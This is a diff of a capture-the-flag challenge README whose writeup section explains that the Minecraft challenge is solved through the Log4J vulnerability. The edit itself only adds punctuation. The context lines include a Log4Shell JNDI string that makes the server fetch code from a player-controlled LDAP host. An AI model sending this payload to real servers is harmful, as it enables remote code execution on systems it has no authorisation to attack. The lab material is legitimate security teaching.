@@ -20,7 +20,7 @@ You'll need to connect using nc even if using the mc client.
 ## Writeup
 The intended solve for this challenge is for you to do some research to find (ie by searching `minecraft logging vuln`) to find out this challenge uses the Log4J vulnerability. You then must write your own payload and find a way to execute it.
 
-Write your exploit and upload it to the web portal
+Write your exploit and upload it to the web portal.
 
 Paste this string in the minecraft chat: `${jndi:ldap://{the ip your container gave you}:1389/a}`
 
